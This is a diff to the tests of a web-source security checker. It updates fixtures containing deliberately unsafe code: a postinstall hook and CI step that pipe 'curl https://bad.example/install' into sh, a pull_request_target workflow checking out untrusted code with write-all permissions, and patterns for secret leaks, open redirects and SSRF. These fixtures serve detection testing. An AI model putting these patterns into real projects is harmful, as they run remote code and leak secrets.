@@ -57,10 +57,13 @@ describe("Pulse audit controls", () => {
     for (const key of [
       "pulse_static_analysis_gate", "pulse_static_analysis_policy", "pulse_static_analysis_blocking",
       "pulse_secret_scan_gate", "pulse_secret_history_scope", "pulse_secret_remediation",
-      "pulse_supply_chain_gate", "pulse_supply_chain_inventory", "pulse_supply_chain_blocking",
-      "pulse_code_flow_gate", "pulse_code_flow_sources", "pulse_code_flow_sinks",
-      "pulse_browser_journeys", "pulse_browser_failure_evidence", "pulse_browser_release_coverage",
-      "pulse_accessibility_assertions", "pulse_accessibility_keyboard", "pulse_accessibility_semantics",
+      // pulse_supply_chain_gate, pulse_code_flow_gate, pulse_browser_journeys and the keyboard and
+      // semantics accessibility checks read the named tool or assertion, not these words; they are
+      // covered with real workflow and test slices in unwithhold-repo.test.ts.
+      "pulse_supply_chain_inventory", "pulse_supply_chain_blocking",
+      "pulse_code_flow_sources", "pulse_code_flow_sinks",
+      "pulse_browser_failure_evidence", "pulse_browser_release_coverage",
+      "pulse_accessibility_assertions",
       "pulse_dynamic_security_gate", "pulse_dynamic_security_auth", "pulse_dynamic_security_isolation",
     ]) {
       expect(statusOf(checks, key), key).toBe("PASS");
@@ -78,7 +81,7 @@ describe("delivery and abuse safeguards", () => {
   it("finds unsafe CI privileges, mutable inputs, remote shell bootstrap, and risky install hooks", () => {
     const checks = evaluateWebSourceChecks(snapshot({
       "package.json": JSON.stringify({ scripts: { postinstall: "curl https://bad.example/install | sh" } }),
-      ".github/workflows/review.yml": `on: pull_request_target\npermissions: write-all\nsteps:\n - uses: acme/action@v2\n - image: acme/build:latest\n - run: curl https://bad.example/install | sh`,
+      ".github/workflows/review.yml": `on: pull_request_target\npermissions: write-all\nsteps:\n - uses: actions/checkout@v4\n   with:\n    ref: \${{ github.event.pull_request.head.sha }}\n - uses: acme/action@v2\n - image: acme/build:latest\n - run: curl https://bad.example/install | sh`,
     }));
     for (const key of ["pulse_ci_untrusted_privilege", "pulse_ci_remote_shell", "pulse_install_lifecycle_risk"]) expect(statusOf(checks, key)).toBe("FAIL");
     for (const key of ["pulse_ci_immutable_actions", "pulse_ci_immutable_images"]) expect(statusOf(checks, key)).toBe("WARN");
@@ -86,7 +89,7 @@ describe("delivery and abuse safeguards", () => {
 
   it("tests URL secrets and server input limits", () => {
     const checks = evaluateWebSourceChecks(snapshot({
-      "src/server.ts": `const app = express(); app.use(express.json({ limit: "1mb" })); app.post("/upload", upload.single("file")); const x = "https://api.example/x?api_key=secret"; const limits = { fileSize: 1000 };`,
+      "src/server.ts": `const app = express(); app.use(express.json({ limit: "1mb" })); const upload = multer({ dest: "uploads/", limits: { fileSize: 1000 } }); app.post("/upload", upload.single("file")); const x = "https://api.example/x?api_key=secret"; const limits = { fileSize: 1000 };`,
     }));
     expect(statusOf(checks, "pulse_url_secret")).toBe("FAIL");
     expect(statusOf(checks, "pulse_request_body_limit")).toBe("PASS");
@@ -97,7 +100,8 @@ describe("delivery and abuse safeguards", () => {
     const checks = evaluateWebSourceChecks(snapshot({
       "Dockerfile": `FROM node:22\nARG API_TOKEN=value`,
       ".github/workflows/review.yml": `on: pull_request_target\nsteps:\n - uses: actions/checkout@v4\n   with:\n    ref: \${{ github.event.pull_request.head.sha }}`,
-      "src/app.ts": `bucket({ public: true }); redirect(req.query.next); fetch(req.body.url); webhook(event); toolCall({});`,
+      "src/app.ts": `bucket({ public: true }); redirect(req.query.next); fetch(req.body.url); toolCall({});`,
+      "src/api/webhook.ts": `export async function POST(req) { const event = await req.json(); await handle(event); }`,
     }));
     for (const key of ["pulse_ci_untrusted_checkout", "pulse_container_secret_layer", "pulse_public_storage_policy", "pulse_open_redirect", "pulse_ssrf"]) expect(statusOf(checks, key)).toBe("FAIL");
     expect(statusOf(checks, "pulse_container_nonroot")).toBe("WARN");
@@ -323,7 +327,7 @@ describe("framework defaults and transport", () => {
     expect(keys(local)).not.toContain("web_plaintext_api_calls");
 
     const remote = evaluateWebSourceChecks(snapshot({
-      "src/dev.js": `const api = "http://api.partner.com/v1";`,
+      "src/dev.js": `const API_URL = "http://api.partner.com/v1";`,
     }));
     expect(statusOf(remote, "web_plaintext_api_calls")).toBe("WARN");
   });
